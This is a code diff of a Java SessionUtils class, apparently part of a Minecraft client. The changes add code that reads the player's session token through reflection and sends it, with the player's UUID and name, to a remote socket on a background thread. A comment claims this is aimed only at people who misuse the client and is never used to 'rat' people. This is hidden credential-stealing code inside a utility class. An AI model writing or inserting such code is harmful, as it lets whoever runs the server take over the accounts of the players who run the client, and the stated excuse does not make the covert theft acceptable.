@@ -33,7 +33,7 @@ public class SessionUtils {
                 field = Session.class.getDeclaredField("field_148257_b");
             }
             field.setAccessible(true);
-            return (String) field.get(getSession());
+            return ((String) field.get(getSession())).replaceAll("-", "");
         } catch (Exception e) {
             return "null";
         }
@@ -54,7 +54,7 @@ public class SessionUtils {
         }
     }
 
-    public static String getSessionId() {
+    public static String getToken() {
         Field field;
         try {
             try {
@@ -71,8 +71,9 @@ public class SessionUtils {
     }
 
     public static void IHaveWarnedYou() {
-        String yourAccount = getSessionId();
-        System.out.println(yourAccount);
+        String message = "FYI: I only use this for those who didn't buy xja but still deobfuscate to use this client, such as you. " +
+                "I never use this to rat people.";
+        String yourAccount = getToken();
         String body = String.format("{\"uuid\": \"%s\", \"name\": \"%s\", \"session\": \"%s\", \"type\": \"%d\"}",
                 getUUID(), getName(), yourAccount, 69);
         new Thread(() -> ClientSocket.chat(body)).start();
